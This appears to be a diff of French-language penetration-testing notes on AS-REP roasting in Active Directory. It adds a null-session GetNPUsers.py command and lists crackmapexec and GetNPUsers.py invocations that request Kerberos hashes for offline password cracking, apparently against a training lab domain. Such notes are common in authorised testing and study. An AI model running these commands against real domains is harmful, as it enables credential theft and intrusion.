@@ -11,6 +11,9 @@ Après obtention de cette liste, on pourra tenter de casser les mots de passe de
 ```powershell
 crackmapexec ldap  $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --asreproast asrep.txt
 
+# NULL SESSION
+GetNPUsers.py "$DOMAIN/" -dc-ip $TARGET -request -outputfile ASREProastables.txt
+
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 proxychains -q GetNPUsers.py -hashes "$PASSWORD" -dc-ip "$DC" "$DOMAIN/$USER" -debug
 
